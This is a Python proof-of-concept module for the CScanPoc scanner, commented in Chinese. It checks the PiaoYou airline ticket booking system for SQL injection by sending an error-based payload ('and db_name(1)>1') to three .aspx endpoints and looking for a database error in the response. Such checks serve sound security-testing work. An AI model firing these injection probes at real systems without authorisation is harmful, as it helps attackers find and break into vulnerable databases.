# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0002'  # 平台漏洞编号，留空
    name = '票友订票系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-17'  # 漏洞公布时间
    desc = '''
        票友软件是一款用于航空票务代理专用机票管理系统，集成网上订票管理、电话录音弹屏、企业差旅管理、同业订单管理、会员管理、积分管理、短信发送、员工管理、报表生成、财务管理等强大功能，广泛应用于有各航空票务代理人及航空售票点，帮助您提高工作效率，迅速了解客户的需求，极大提高业务成交量，提升客户满意度，协助您在激烈的市场竞争中脱颖而出。
        票友订票系统存在多处SQL注入漏洞：
        /newslist.aspx
        /news_view.aspx
        /news_view.aspx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0101565'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = '票友订票系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dc3a0c6a-bba9-43d9-8ff5-4eaf1a7bacd7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101565
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101570
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101572
            payload1 = [
                '/newslist.aspx?a=1',
                '/news_view.aspx?a=4',
                '/news_view.aspx?id=4'
            ]
            for payload in payload1:
                verify_url = self.target + payload + '%20and%20db_name%281%29%3E1'
                #code, head, res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)

                if r.status_code == 500 and 'master' in r.text:
                    #security_hole(arg + payload + '  :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
